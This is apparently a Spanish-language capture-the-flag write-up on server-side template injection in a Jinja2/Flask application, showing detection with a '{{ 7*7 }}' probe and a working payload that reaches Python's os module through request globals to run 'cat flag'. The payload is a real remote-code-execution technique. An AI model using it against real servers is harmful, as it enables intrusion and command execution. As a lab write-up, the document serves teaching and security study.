## ¿Qué es SSTI?

**SSTI (Server-Side Template Injection)** ocurre cuando una aplicación:

- Usa plantillas dinámicas (ej: Jinja2)
- Inserta directamente entrada del usuario sin sanitizar


Esto permite ejecutar código en el servidor.

## Detección de SSTI

Se prueba una expresión simple:

```text
{{ 7*7 }}
```

Si el servidor responde:

```
49
```

Entonces la plantilla está evaluando código → vulnerable a SSTI
## Explotación

Dado que el servidor usa Jinja2, se puede acceder a objetos internos de Python.

Se utiliza el siguiente payload:

```jinja
{{ request.application.__globals__.__builtins__.__import__('os').popen('cat flag').read() }}
```

---

## Explicación del payload

Paso a paso:

- `request` → objeto de la petición HTTP
    
- `application` → referencia a la aplicación Flask
    
- `__globals__` → acceso al contexto global de Python
    
- `__builtins__` → funciones internas de Python
    
- `__import__('os')` → importa el módulo `os`
    
- `popen('cat flag')` → ejecuta comando en el sistema
    
- `read()` → lee la salida
    

Al ejecutar el comando nos regresa la flag.

## Referencias

Un ataque de inyección de plantillas del lado del servidor (SSTI) ocurre cuando un atacante explota la sintaxis nativa de una plantilla e inyecta código malicioso en ella. La plantilla comprometida se ejecuta posteriormente en el servidor. Un motor de plantillas genera una página web combinando una plantilla fija con datos variables. 

Los atacantes utilizan la técnica de inyección de plantillas del lado del servidor para insertar directamente datos de usuario en las plantillas, lo que les permite introducir directivas arbitrarias que alteran el comportamiento del motor de plantillas. Esto puede permitir a los ciberdelincuentes obtener el control total del servidor objetivo.
